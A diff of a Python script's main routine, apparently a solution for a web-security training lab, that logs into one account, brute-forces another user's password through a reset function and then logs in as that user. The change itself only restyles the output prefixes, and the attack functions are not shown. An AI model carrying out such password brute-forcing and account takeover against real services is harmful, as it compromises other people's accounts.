@@ -58,23 +58,23 @@ if __name__ == "__main__":
         url = sys.argv[1]
         session = requests.Session()          
         
-        print("(+) Logging into Wiener's account...")
+        print("[+] Logging into Wiener's account...")
         if not login_to_wiener_account(url, session):
             print("(-) Login to Wiener's account failed.") 
             sys.exit(FAIL)    
         
-        print("(+) Brute-forcing Carlos's password...")
+        print("[+] Brute-forcing Carlos's password...")
         password = reset_carlos_password(url, session)
         print("[+] Carlos's password is '%s'" % password)  
         
-        print("(+) Logging into Carlos's account...")
+        print("[+] Logging into Carlos's account...")
         if not access_carlos_account(url, password):
-            print("(-) Login to Carlos's account failed.") 
+            print("[-] Login to Carlos's account failed.") 
             sys.exit(FAIL)
-        print("(+) Login to Carlos's account successful.")
+        print("[+] Login to Carlos's account successful.")
     except IndexError:
-        print("(+) Usage: %s <url>" % sys.argv[0])
-        print("(+) Example: %s www.example.com" % sys.argv[0])
+        print("[+] Usage: %s <url>" % sys.argv[0])
+        print("[+] Example: %s www.example.com" % sys.argv[0])
         sys.exit(FAIL)
     except Exception as exception:
         print("An exception occured %s" % exception)
